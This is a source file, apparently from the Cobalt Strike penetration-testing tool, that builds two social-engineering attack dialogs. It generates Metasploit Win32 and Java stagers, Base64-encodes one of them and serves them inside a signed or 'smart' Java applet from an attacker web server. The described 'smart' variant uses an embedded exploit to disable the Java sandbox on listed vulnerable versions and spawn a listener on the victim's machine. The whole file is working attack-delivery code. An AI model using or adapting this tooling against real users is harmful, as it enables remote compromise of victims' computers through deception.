#
# Cloud Strike Social Engineering Packages
#

import javax.swing.*;
import javax.swing.event.*;
import javax.swing.filechooser.*;

import java.awt.*;
import java.awt.event.*;
import java.awt.datatransfer.*;

import java.io.*;
import java.util.zip.*;

import ui.*;

sub _setupAppletAttack {
	local('$status %options $event $payload $applet $win_data $java_data $handle');

	(%options, $event) = @_;

	# Step -1. Let Cortana script redefine what we use...
	($class, $resource) = filter_data($filter, $class, $resource);

	# Step 0. Read in our signed applet from our resources folder
	$handle = [SleepUtils getIOHandle: resource($resource), $null];
	$applet = readb($handle, -1);
	closef($handle);

	# sanity check!
	if (strlen($applet) == 0) {
		showError("I could not find $resource on this system!\nMake sure this file is where your applet.cna script expects it."); 
		return;
	}
	
	# Step 1. Generate Base64 encoded stager for our Windows listener
	$payload = fixListenerOptions(%options);
	if ($payload !is $null) {
		%options["Format"]   = "raw";
		%options["EXITFUNC"] = "thread";
		%options["Encoder"]  = "generic/none";

		call_async_callback($client, "module.execute", $this, "payload", "payload/ $+ $payload", %options);
		yield;
		$win_data = convertAll($1)["payload"];
		$win_data = [msf.Base64 encode: cast($win_data, 'b')];
	}
	else {
		showError("Couldn't find Win32 listener:\n" . %options['listener']);
		return;
	}

	# Step 2. Generate stager for our Java listener
	%options['listener'] = %options['listener2'];
	$payload = fixListenerOptions(%options);
	if ($payload !is $null) {
		%options["Format"]   = "raw";
		%options["EXITFUNC"] = "thread";
		%options["Encoder"]  = "generic/none";

		call_async_callback($client, "module.execute", $this, "payload", "payload/ $+ $payload", %options)
		yield;
		$java_data = convertAll($1)["payload"];
	}
	else {
		showError("Couldn't find Java listener:\n" . %options['listener']);
		return;
	}

	# Step 3. Host the Applet
		# $applet = raw data
		# $win_data = Base64 encoded string
		# $java_data = raw data
	call_async_callback($mclient, "cloudstrike.host_applet", $this, %options['SRVPORT'], %options['URIPATH'], $applet, $win_data, $java_data, $class, $title);
	yield;
	$status = convertAll($1);

	if ($status['status'] eq "success") {
		startedWebService("host applet", "http:// $+ $MY_ADDRESS $+ :" . %options["SRVPORT"] . %options["URIPATH"]);
		elog("host applet @ http:// $+ $MY_ADDRESS $+ :" . %options["SRVPORT"] . %options["URIPATH"]);
		if (!isShift($event)) {
			[$dialog setVisible: 0];
		}
	}
	else {
		showError("Unable to start web server:\n" . $status['status']);
	}
}

sub setupAppletAttack {
	# make sure that each run of _setupAppletAttack gets fresh context!
	[lambda(&_setupAppletAttack, \$dialog, \$resource, \$class, \$title, \$filter): $1, $2];
}

sub createSignedApplet {
	local('$a $b $middle @functions %options $generate $help $dialog');

	# pre-set some of the options
	%options['SRVPORT']     = '80';
	%options['URIPATH']     = '/mPlayer';

	# the meat of the form...
	$a = [new JPanel];
	matrixLayout($a, @(
		ui:text(    "URI Path: *"      , "URIPATH",     @functions, %options),
		ui:text(    "Port: *"          , "SRVPORT",     @functions, %options),
		ui:listener("Java Listener:"   , "listener2",   @functions, %options, '*java*')
		ui:listener("Win32 Listener:"  , "listener",    @functions, %options, '*windows*')
	), 3);

	# set up the dialog.
	$dialog = dialog("Self-signed Applet Attack", 640, 480);
	[$dialog setLayout: [new BorderLayout]];

	# buttons...
	$generate = ui:action_noclose("Launch", @functions, %options, $dialog, lambda(&setupAppletAttack, \$dialog, $resource => "resources/applet_signed.jar", $class => "Java.class", $title => "signed applet", $filter => "cobaltstrike_signed_applet"));
	$help = [new JButton: "Help"];
	[$help addActionListener: gotoURL("http://www.advancedpentest.com/help-java-signed-applet-attack")];

	# display the form...
	[$dialog add: description("This package sets up a self-signed Java applet. This package will spawn the specified listener if the user gives the applet permission to run."), [BorderLayout NORTH]];
	[$dialog add: $a, [BorderLayout CENTER]];
	[$dialog add: center($generate, $help), [BorderLayout SOUTH]];

	[$dialog pack];
	[$dialog setVisible: 1];
}

sub createSmartApplet {
	local('$a $b $middle @functions %options $generate $help $dialog');

	# pre-set some of the options
	%options['SRVPORT']     = '80';
	%options['URIPATH']     = '/SiteLoader';

	# the meat of the form...
	$a = [new JPanel];
	matrixLayout($a, @(
		ui:text(    "URI Path: *"      , "URIPATH",     @functions, %options),
		ui:text(    "Port: *"          , "SRVPORT",     @functions, %options),
		ui:listener("Java Listener:"   , "listener2",   @functions, %options, '*java*')
		ui:listener("Win32 Listener:"  , "listener",    @functions, %options, '*windows*')
	), 3);

	# set up the dialog.
	$dialog = dialog("Smart Applet Attack", 640, 480);
	[$dialog setLayout: [new BorderLayout]];

	# buttons...
	$generate = ui:action_noclose("Launch", @functions, %options, $dialog, lambda(&setupAppletAttack, \$dialog, $resource => "resources/applet_rhino.jar", $class => "JavaApplet.class", $title => "smart applet", $filter => "cobaltstrike_smart_applet"));
	$help = [new JButton: "Help"];
	[$help addActionListener: gotoURL("http://www.advancedpentest.com/help-java-smart-applet-attack")];

	# display the form...
	[$dialog add: description("<html><body>The Smart Applet detects the Java version and uses an embedded exploit to disable the Java security sandbox. This attack is cross-platform and cross-browser.<p><b>Vulnerable Java Versions</b></p><ul><li>Java 1.6.0_45 and below</li><li>Java 1.7.0_21 and below</li></ul></body></html>"), [BorderLayout NORTH]];
	[$dialog add: $a, [BorderLayout CENTER]];
	[$dialog add: center($generate, $help), [BorderLayout SOUTH]];

	[$dialog pack];
	[$dialog setVisible: 1];
}

